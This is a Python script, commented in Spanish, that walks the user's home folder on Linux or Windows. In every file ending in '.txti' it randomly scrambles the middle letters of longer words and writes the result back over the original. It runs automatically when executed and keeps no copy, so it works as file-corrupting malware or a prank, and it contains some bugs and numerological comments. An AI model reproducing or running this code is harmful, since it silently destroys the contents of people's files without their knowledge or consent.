__author__ = 'Joel'
import time
import random
import platform
import os
#Se coge la palabra, # se mantiene la primera y la ultima letra y las de en medio se intercambian de forma aleatoria
#El proceso de intercambiado es: se coloca en una posicion aleatoria de las letras y se intercambia de forma aleatoria
# con otra posicion aleatoria si calculando el timestamp con el modulo de la fecha de creacion de linux
# (25 de agosto de 1991 = 25081991), se suman todas las cifras hasta que quede un numero y si ese numero es multiplo
# de los 4 elementos (fuego, tierra, agua, aire, eter) entonces intercambia con otra letra aleatoria de la palabra
linuxCreationTime = 25081991
conditionChange = 7 # elemntos basicos

def twistWord(word):
    #print(word)
    twisted = list(word)
    while (calcCondition() % conditionChange) != 0:
        aux1 = random.randrange(1, len(word)-1)
        aux2 = random.randrange(1, len(word)-1)
        aux3 = twisted[aux1]
        twisted[aux1] = twisted[aux2]
        twisted[aux2] = aux3
    #print(''.join(twisted))
    return ''.join(twisted)

def calcCondition():
    modulo = int(time.time()) + random.randint(1, 10) % linuxCreationTime
    #print(modulo)
    #numCondition = random.randrange(1, len(str(linuxCreationTime))-4)
    numCondition = 1
    res = 0
    while len(str(modulo)) > numCondition:
        #print('miau2')
        for cifra in str(modulo):
            #print(cifra)
            res += int(cifra)
        modulo = res
        res = 0
    return modulo

def twistText(file):
    readFile = open(file, 'r')
    newList = list()
    pointer = 0
    text = list(readFile.read())
    #print(text)
    aux = ''
    cont = 0
    for t in text:
        cont += 1
        if t.isalnum():
            aux += t
        else:
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            newList.append(t)
            aux = ''
        if cont == len(text):
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            aux = ''
    #print(''.join(newList))
    readFile.close()
    writeFile = open(file, 'w')
    writeFile.write(''.join(newList))
    writeFile.close()

def searchTextFiles():
    OS = platform.system()
    rootDir = '.'
    if OS == 'Windows':
        os.chdir('USERPROFILE')
    elif OS == 'Linux':
        os.chdir(os.getenv('HOME'))
    for dirName, subdirList, fileList in os.walk(rootDir):
        print(dirName)
        for fname in fileList:
            print(fname)
            if fname.split('.')[-1].lower() == 'txti':
                twistText(os.path.join(dirName, fname))


searchTextFiles()